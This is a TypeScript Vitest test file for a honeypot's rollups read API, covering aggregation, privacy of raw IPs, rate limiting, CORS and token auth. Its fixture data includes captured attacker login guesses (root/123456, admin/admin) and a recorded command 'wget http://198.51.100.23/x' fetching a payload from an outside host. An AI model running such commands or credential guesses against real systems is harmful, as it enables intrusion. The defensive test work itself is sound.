import { afterEach, beforeEach, describe, expect, it } from "vitest";
import type { Server } from "node:http";
import type { SqlClient } from "../src/sql.js";
import { EventRepository } from "../src/repository.js";
import { freshRepo } from "./helpers/pglite.js";
import { buildReadServer } from "../src/read-server.js";
import { aggregate } from "../src/aggregate.js";
import { normalizeEvent, NO_ENRICHMENT, type StoredEvent, type WireEvent } from "../src/schema.js";
import { hashIp, truncateIp } from "../src/privacy.js";
import { TokenBucket } from "../src/ratelimit.js";

let server: Server;
let sql: SqlClient;
let repo: EventRepository;
let base: string;

function store(e: Partial<WireEvent> & { type: WireEvent["type"] }): StoredEvent {
  const wire = {
    id: crypto.randomUUID(),
    ts: new Date(Date.now() - 5000).toISOString(),
    src_ip: "203.0.113.7",
    ...e,
  } as WireEvent;
  return normalizeEvent(wire, "hp-1", "secret-0123456789abcdef", NO_ENRICHMENT, { hashIp, truncateIp });
}

async function listen(s: Server): Promise<string> {
  await new Promise<void>((resolve) => s.listen(0, "127.0.0.1", resolve));
  const addr = s.address();
  if (addr === null || typeof addr === "string") throw new Error("no address");
  return `http://127.0.0.1:${addr.port}`;
}

beforeEach(async () => {
  ({ sql, repo } = await freshRepo());
  await repo.insertEvents([
    store({ type: "login_attempt", username: "root", password: "123456", success: false }),
    store({ type: "login_attempt", username: "root", password: "123456", success: false }),
    store({ type: "login_attempt", username: "admin", password: "admin", success: true, src_ip: "2001:db8::7" }),
    store({ type: "session_connect", protocol: "ssh" }),
    store({ type: "command", command: "wget http://198.51.100.23/x" }),
  ]);
  await aggregate(repo);
  server = buildReadServer({ repo });
  base = await listen(server);
});

afterEach(async () => {
  await new Promise<void>((resolve) => server.close(() => resolve()));
  await sql.close();
});

describe("rollups read API", () => {
  it("serves the aggregate dashboard payload as JSON", async () => {
    const res = await fetch(`${base}/v1/rollups`);
    expect(res.status).toBe(200);
    expect(res.headers.get("cache-control")).toBe("private, no-store");
    const body = await res.json();
    expect(body.hasData).toBe(true);
    expect(body.totals.totalLoginAttempts).toBe(3);
    expect(body.totals.ipv4Attempts24h).toBe(2);
    expect(body.totals.ipv6Attempts24h).toBe(1);
    expect(body.credentials[0]).toEqual({ username: "root", password: "123456", count: 2 });
    expect(body.attck.length).toBeGreaterThan(0);
  });

  it("never exposes raw event fields (no full IPs, hashes, or event ids)", async () => {
    const text = await (await fetch(`${base}/v1/rollups`)).text();
    // truncated prefixes and hashes live only on raw events, never in rollups
    expect(text).not.toContain("203.0.113.7");
    expect(text).not.toContain("src_ip_hash");
    expect(text).not.toContain("received_at");
  });

  it("only answers GET/HEAD on /v1/rollups and /healthz", async () => {
    expect((await fetch(`${base}/healthz`)).status).toBe(200);
    expect((await fetch(`${base}/other`)).status).toBe(404);
    expect((await fetch(`${base}/v1/rollups`, { method: "POST" })).status).toBe(405);
    expect((await fetch(`${base}/v1/events`, { method: "POST" })).status).toBe(405);
  });

  it("rate limits callers", async () => {
    await new Promise<void>((resolve) => server.close(() => resolve()));
    server = buildReadServer({
      repo,
      perIpLimiter: new TokenBucket(2, 0.001),
      globalLimiter: new TokenBucket(1000, 1000),
    });
    base = await listen(server);
    expect((await fetch(`${base}/v1/rollups`)).status).toBe(200);
    expect((await fetch(`${base}/v1/rollups`)).status).toBe(200);
    const limited = await fetch(`${base}/v1/rollups`);
    expect(limited.status).toBe(429);
    expect(limited.headers.get("retry-after")).toBe("5");
  });

  it("sets an ACAO header only when an allow-origin is configured", async () => {
    const withoutCors = await fetch(`${base}/v1/rollups`);
    expect(withoutCors.headers.get("access-control-allow-origin")).toBeNull();

    await new Promise<void>((resolve) => server.close(() => resolve()));
    server = buildReadServer({ repo, allowOrigin: "https://hunang.kastro.is" });
    base = await listen(server);
    const withCors = await fetch(`${base}/v1/rollups`);
    expect(withCors.headers.get("access-control-allow-origin")).toBe("https://hunang.kastro.is");
  });

  it("rejects a bad read token before querying rollups", async () => {
    await new Promise<void>((resolve) => server.close(() => resolve()));
    server = buildReadServer({ repo, readToken: "read-token-0123456789abcdef" });
    base = await listen(server);

    expect((await fetch(`${base}/v1/rollups`)).status).toBe(401);
    expect(
      (
        await fetch(`${base}/v1/rollups`, {
          headers: { authorization: "Bearer read-token-0123456789abcdef" },
        })
      ).status,
    ).toBe(200);
  });
});
